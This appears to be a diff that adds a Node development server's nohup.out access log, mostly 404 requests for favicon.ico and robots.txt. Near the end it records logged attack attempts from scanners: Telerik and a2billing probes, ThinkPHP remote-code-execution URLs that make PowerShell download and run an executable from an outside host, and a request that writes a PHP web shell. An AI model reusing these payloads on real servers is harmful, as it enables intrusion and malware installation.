+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.457 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.567 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.438 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.523 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.986 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.436 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.478 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.513 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.600 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.988 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.445 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.586 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m1.576 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.533 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.458 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.540 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m1.055 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.597 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m96.521 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/pass [33m404 [0m0.962 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/pass [33m404 [0m0.395 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/pass [33m404 [0m0.390 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/pass [33m404 [0m0.980 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/pass [33m404 [0m0.419 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/pass [33m404 [0m0.382 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/version.js [33m404 [0m0.908 ms - 166[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /client_area/ [33m404 [0m0.380 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /system_api.php [33m404 [0m0.415 ms - 153[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming/clients_live.php [33m404 [0m0.421 ms - 165[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/ [33m404 [0m0.412 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /api.php [33m404 [0m0.376 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /login.php [33m404 [0m0.370 ms - 148[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming [33m404 [0m0.363 ms - 148[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming/clients_live.php [33m404 [0m0.358 ms - 165[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming/Lge8wIgGG.php [33m404 [0m0.266 ms - 162[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.690 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.445 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m1.119 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.482 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.533 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/1 [33m404 [0m1.107 ms - 140[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/1 [33m404 [0m0.404 ms - 140[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/1 [33m404 [0m0.405 ms - 140[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m1.094 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.963 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m0.933 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m1.099 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mPOST //a2billing/customer/checkout_process.php [33m405 [0m0.127 ms - 0[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mPOST //a2billing/customer/checkout_process.php [33m405 [0m0.024 ms - 0[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET //a2billing/admin/Public/A2B_entity_backup.php?path=/var/www/html/_asterisk/xyx.php&form_action=add&name=check [33m404 [0m0.646 ms - 184[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mPOST //a2billing/admin/Public/A2B_entity_backup.php [33m405 [0m0.027 ms - 0[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mPOST //_asterisk/xyx.php [33m405 [0m0.025 ms - 0[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mPOST //_asterisk/Q6PJ5ND2QT9A48U.php [33m405 [0m0.066 ms - 0[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /nice%20ports%2C/Tri%6Eity.txt%2ebak [33m404 [0m100.454 ms - 174[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.507 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.589 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.466 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.379 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.829 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.770 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.403 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.508 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.591 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.808 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.630 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/1 [33m404 [0m1.094 ms - 140[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/1 [33m404 [0m0.526 ms - 140[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/1 [33m404 [0m0.575 ms - 140[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.853 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.790 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.565 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.991 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.547 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.842 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.560 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.661 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.610 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.497 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.474 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.558 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.548 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.657 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.555 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.392 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.419 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.440 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.579 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.529 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.433 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.837 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.904 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /HNAP1/ [33m404 [0m0.521 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.833 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.474 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.468 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.502 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.886 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /HNAP1/ [33m404 [0m0.480 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /HNAP1/ [33m404 [0m0.479 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.607 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.469 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.523 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m59.440 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.809 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m1.264 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.760 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.441 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m2.401 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.498 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m1.116 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.497 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.403 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.798 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.498 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.867 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m1.762 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.450 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.489 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m1.019 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.468 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.466 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.742 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.498 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.380 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m1.189 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.712 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.466 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.390 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.627 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.425 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.679 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.369 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.528 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.516 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.555 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.525 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m1.124 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /manager/html [33m404 [0m2.246 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.454 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m44.822 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.535 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.560 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.570 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m33.633 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.485 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.432 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.396 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.421 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m1.052 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.540 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.372 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.540 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.605 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.437 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.400 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.433 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m55.188 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m2.320 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.538 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.472 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.502 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.368 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.392 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.467 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.524 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.487 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.766 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.476 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m1.103 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.988 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.495 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.401 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.331 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/snzcrtggnxgqjpw22014.exe');start%20C:/Windows/temp/snzcrtggnxgqjpw22014.exe [33m404 [0m0.878 ms - 155[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php [33m404 [0m0.372 ms - 155[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/snzcrtggnxgqjpw22014.exe');start%20C:/Windows/temp/snzcrtggnxgqjpw22014.exe [33m404 [0m1.461 ms - 155[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.535 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /nice%20ports%2C/Tri%6Eity.txt%2ebak [33m404 [0m0.453 ms - 174[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.359 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.457 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.455 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.416 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.769 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.423 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.394 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m1.103 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.639 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.980 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.829 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.841 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.859 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m0.913 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.557 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.601 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.411 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.843 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.440 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.438 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.265 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.490 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
